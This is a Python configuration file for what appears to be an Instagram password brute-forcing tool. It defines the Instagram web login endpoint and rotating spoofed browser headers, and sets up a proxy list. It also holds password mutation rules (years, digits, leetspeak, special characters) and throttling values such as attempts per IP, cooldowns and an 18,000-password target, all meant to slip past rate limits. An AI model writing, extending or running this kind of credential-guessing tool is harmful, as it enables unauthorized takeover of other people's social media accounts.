#!/usr/bin/env python3
import os
import random

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(ROOT_DIR, "data")
WORDLIST_DIR = os.path.join(DATA_DIR, "wordlists")
OUTPUT_DIR = os.path.join(ROOT_DIR, "output", "results")
PROFILES_DIR = os.path.join(ROOT_DIR, "output", "profiles")
PROXY_FILE = os.path.join(DATA_DIR, "proxies.txt")

for _d in (OUTPUT_DIR, WORDLIST_DIR, DATA_DIR, PROFILES_DIR):
    os.makedirs(_d, exist_ok=True)

if not os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        f.write("# one proxy per line\n")
        f.write("# ip:port\n")
        f.write("# ip:port:user:pass\n")
        f.write("# http://ip:port\n")
        f.write("# socks5://ip:port\n")

INSTAGRAM_ENDPOINTS = {
    "login": "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
    "web_profile": "https://i.instagram.com/api/v1/users/web_profile_info/",
    "home": "https://www.instagram.com/",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
]

IG_APP_ID = "936619743392459"

def get_random_headers(username=None):
    ua = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": ua,
        "Accept": "*/*",
        "Accept-Language": random.choice(
            ["en-US,en;q=0.9", "en-GB,en;q=0.9", "ar,en;q=0.8"]
        ),
        "Accept-Encoding": "gzip, deflate, br",
        "X-IG-App-ID": IG_APP_ID,
        "X-ASBD-ID": "129477",
        "X-IG-WWW-Claim": "0",
        "Origin": "https://www.instagram.com",
        "Referer": (
            f"https://www.instagram.com/{username}/"
            if username
            else "https://www.instagram.com/"
        ),
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Connection": "keep-alive",
    }
    return headers

MUTATION_PATTERNS = {
    "basic": [
        "{word}",
        "{word}{year}",
        "{word}{num}",
        "{word}@{num}",
        "{word}#{num}",
        "{word}!",
        "{word}.",
    ],
    "advanced": [
        "{word}{year}{special}",
        "{word}_{num}",
        "{word}{month}{day}",
        "{capitalize}{num}",
        "{leet}",
        "{word}{day}{month}",
    ],
    "complex": [
        "{word1}{word2}{num}",
        "{word1}_{word2}",
        "{word1}{word2}{year}",
        "{word1}{special}{word2}{num}",
        "{leet}{year}",
    ],
}

LEET_MAP = str.maketrans(
    {
        "a": "4",
        "A": "4",
        "e": "3",
        "E": "3",
        "i": "1",
        "I": "1",
        "o": "0",
        "O": "0",
        "s": "5",
        "S": "5",
        "t": "7",
        "T": "7",
        "b": "8",
        "B": "8",
        "g": "9",
        "G": "9",
        "l": "1",
        "L": "1",
    }
)

SPECIAL_CHARS = ["!", "@", "#", "$", "%", "*", ".", "_", "?", "&"]

MIN_DELAY = 2
MAX_DELAY = 8
MAX_ATTEMPTS_PER_IP = 15
COOLDOWN_PERIOD = 120
TARGET_PASSWORD_COUNT = 18000
MAX_COMBINATIONS = 50000
REQUEST_TIMEOUT = 25
